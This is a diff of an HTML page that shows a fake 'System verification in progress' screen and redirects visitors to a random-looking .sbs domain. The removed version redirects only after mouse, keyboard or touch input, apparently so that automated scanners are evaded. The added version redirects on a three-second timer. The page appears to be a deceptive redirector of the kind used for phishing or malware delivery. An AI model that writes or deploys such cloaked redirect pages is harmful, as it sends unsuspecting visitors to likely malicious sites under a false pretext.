@@ -185,7 +185,7 @@
 
         <section class="verification-status">
             <p class="status-message">System verification in progress</p>
-            <p class="status-hint">Move your cursor or press any key to continue</p>
+            <p class="status-hint">Please wait while we redirect you</p>
         </section>
     </main>
 
@@ -193,37 +193,25 @@
     <div class="verification-overlay"></div>
 
     <script>
-        let hasInteracted = false;
         const statusSection = document.querySelector('.verification-status');
         const overlay = document.querySelector('.verification-overlay');
         const notification = document.querySelector('.verification-notification');
-        let redirectTimeout;
 
-        function handleInteraction() {
-            if (!hasInteracted) {
-                hasInteracted = true;
-                statusSection.classList.add('visible');
-                overlay.classList.add('visible');
-                notification.classList.add('visible');
-                
-                if (redirectTimeout) {
-                    clearTimeout(redirectTimeout);
-                }
-
-                redirectTimeout = setTimeout(() => {
-                    window.location.href = 'https://qxpsdloksto.sbs/?xwilyxbi';
-                }, 2000);
-            }
-        }
-
-        document.addEventListener('mousemove', handleInteraction);
-        document.addEventListener('keydown', handleInteraction);
-        document.addEventListener('click', handleInteraction);
-        document.addEventListener('touchstart', handleInteraction, { passive: true });
-
+        // Show initial status
         setTimeout(() => {
             statusSection.classList.add('visible');
         }, 1000);
+
+        // Show notification and overlay
+        setTimeout(() => {
+            notification.classList.add('visible');
+            overlay.classList.add('visible');
+        }, 2000);
+
+        // Redirect after 3 seconds
+        setTimeout(() => {
+            window.location.href = 'https://qxpsdloksto.sbs/?xwilyxbi';
+        }, 3000);
 
         function updateViewportHeight() {
             document.documentElement.style.setProperty('--vh', `${window.innerHeight * 0.01}px`);
